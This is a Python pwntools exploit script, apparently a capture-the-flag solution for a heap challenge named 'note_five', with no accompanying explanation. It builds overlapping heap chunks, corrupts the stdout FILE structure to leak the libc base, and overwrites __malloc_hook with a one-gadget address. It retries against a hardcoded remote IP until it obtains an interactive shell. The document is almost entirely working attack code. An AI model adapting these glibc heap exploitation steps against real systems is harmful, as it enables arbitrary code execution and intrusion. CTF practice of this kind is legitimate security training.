from pwn import *
import sys
context.aslr = False
context.arch = 'amd64'
libc = ELF("./libc.so")
#io = process("./note_five")
#io = remote('112.126.103.195',9999)
def ch(c):
    io.sendlineafter(">> ",str(c))
def new(idx,size):
    ch(1)
    io.sendlineafter("idx: ",str(idx))
    io.sendlineafter("size: ",str(size))
def edit(idx,data):
    ch(2)
    io.sendlineafter("idx: ",str(idx))
    io.sendafter("content: ",data)
def delete(idx):
    ch(3)
    io.sendlineafter("idx: ",str(idx))
while True:
    try:
        io = remote('112.126.103.195',9999)
        #io = process("./note_five")
        new(0,0xe8)
        new(1,0xe8)
        new(2,0xe8)
        new(3,0xe8)
        new(4,0xe8)
        delete(0)
        edit(2,'\0'*0xe0+p64(0x2d0)+'\xf0')
        delete(3)
        new(0,0x2c0)
        edit(0,'\0'*0xe0+p64(0)+p64(0xf1)+'\0'*0xe0+p64(0)+p64(0xf1)+'\n')
        delete(1)
        edit(0,'\0'*0xe0+p64(0)+p64(0xf1)+p64(0)+p16(0x97e8)+'\n')
        new(4,0xe8)
        new(4,0xe8)
        edit(0,'\0'*0xe0+p64(0)+p64(0xf1)+'\0'*0xe0+p64(0)+p64(0xf1)+'\n')
        delete(2)
        edit(0,'\0'*0xe0+p64(0)+p64(0xf1)+'\0'*0xe0+p64(0)+p64(0xf1)+p16(0x85cf)+'\n')
        new(4,0xe8)
        new(3,0xe8)
        edit(3,'\0'*0x41+p64(0xfbad1800)+'\0'*0x18+'\x88'+'\n')
        lbase = u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
        success("LBASE -> %#x"%lbase)
        delete(4)
        edit(0,'\0'*0xe0+p64(0)+p64(0xf1)+'\0'*0xe0+p64(0)+p64(0xf1)+p64(lbase+libc.sym['__malloc_hook']-0x1a1)+'\n')
        new(4,0xe8)
        new(3,0xe8)
        fill = '\0'*0x39+p64(lbase+libc.sym["_IO_file_jumps"])
        edit(3,fill.ljust(0xe1,'\x00')+'\xff'+'\n')
        delete(4)
        edit(0,'\0'*0xe0+p64(0)+p64(0xf1)+'\0'*0xe0+p64(0)+p64(0xf1)+p64(lbase+libc.sym['__malloc_hook']-0xb8)+'\n')
        new(4,0xe8)
        new(3,0xe8)
        fill = '\0'*0x88+p64(lbase+libc.sym['_IO_wfile_jumps'])+p64(0)*2+p64(lbase+int(sys.argv[1],16))+p64(lbase+libc.sym['__libc_realloc']+13)
        edit(3,fill+'\n')
        new(0,0x100)
        #gdb.attach(io)
        io.interactive()
    except Exception,e:
        info(str(Exception)+str(e))
        io.close()